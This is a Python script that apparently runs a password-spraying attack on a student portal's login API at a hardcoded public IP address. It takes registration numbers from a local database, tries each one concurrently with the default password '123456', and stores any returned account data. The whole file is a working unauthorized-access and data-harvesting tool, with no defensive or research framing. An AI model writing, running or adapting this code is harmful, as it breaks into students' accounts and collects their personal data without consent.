import requests as req
import concurrent.futures
import time
import json
import sqlite3
import traceback

# DB_PATH = "./db/test.db"
# SERVER_ADDRESS = "http://127.0.0.1:8080/api/student/login"
DB_PATH = "./db/regs.db"
SERVER_ADDRESS = "http://103.113.200.45:8006/api/student/login"
LIMIT = 20

def save_res(name=None, txt="", save_path="./res"):
    if not name:
        name = f"{time.time()}"
    file_path = f"{save_path}/{name}.res"
    with open(file_path, "w") as file:
        file.write(str(txt))
        file.close()


def logger_z(name=None, txt="", save_path="./log"):
    if not name:
        name = f'{int(time.time())}'
    log_path = f'{save_path}/{name}.log'
    with open(log_path, "w") as file:
        file.write(str(txt))
        file.close()


def get_regs(limit=10):
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    data = cursor.execute(
        f"SELECT reg FROM Regs WHERE data IS NULL LIMIT {limit}").fetchall()
    conn.close()
    return list(map(lambda d: d[0], data))


def save_in_db(datas=[]):
    try:
        if not datas.__len__:
            return
        conn = sqlite3.connect(DB_PATH)
        curs = conn.cursor()
        curs.executemany(
            '''UPDATE Regs SET data = ? WHERE reg = ?''', datas)
        conn.commit()
        conn.close()
        print(datas.__len__(),"Saved")
    except Exception as err:
        print(err, json.dumps(datas,indent=4))
        exit()


def collect_data(reg):
    reg = str(reg)
    form_data = {
        "username": str(reg),
        "password": "123456",
        "recaptcha-v3": "undefined"
    }
    data_info = {
        "reg": reg, "data": None
    }
    try:
        res = req.post(SERVER_ADDRESS, data=form_data, timeout=3600)
        res.raise_for_status()
        # save_res(reg, res.content)
        data_info['data'] = res.json()
        print(reg, "Collected.")
    except Exception as e:
        # logger(reg, f"{reg} : {str(e)}")
        print(reg, e)
    return data_info


def collect_regs_data(reg_list):
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            while True:
                results = list(executor.map(collect_data, reg_list))
                return results
    except Exception as err:
        print(err)
        exit()


def worker():
    regs = get_regs(LIMIT)
    if not bool(regs):
        print(regs.__len__(),"Found")
        exit()
    datas = collect_regs_data(regs)
    datas = list(filter(lambda d:d['data'],datas))
    def map_def(d):
        return (json.dumps(d["data"]),int(d["reg"]))
    datas = list(map(map_def,datas))
    
    save_in_db(datas)


def main():
    while True:
        try:
            worker()
            # break
        except KeyboardInterrupt:
            exit()
        except Exception as err:
            print(err.__traceback__.tb_lineno)
            traceback.print_exc()
            exit()


if __name__ == "__main__":
    main()
